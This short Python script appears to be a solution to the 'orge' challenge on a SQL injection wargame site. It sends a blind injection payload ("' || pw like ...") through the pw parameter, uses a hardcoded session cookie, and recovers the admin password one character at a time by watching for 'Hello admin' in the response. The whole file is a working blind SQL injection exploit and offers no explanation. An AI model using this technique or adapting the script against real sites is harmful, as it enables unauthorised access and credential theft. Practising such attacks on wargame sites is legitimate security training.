import requests
import string

session = requests.Session()

url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php?pw=' || pw like '{}%"
cookies = {"PHPSESSID": "t2olebiumhrkeldqqkd0g2c5q0"}
pw = ""
for j in range(10):
    for i in string.printable:
        r = requests.get(url.format(pw+i), cookies=cookies)
        if('Hello admin' in r.text[:200] and i not in "#%&"):
            pw += i
            print("Password :", pw)
            break

print("Password :", pw)
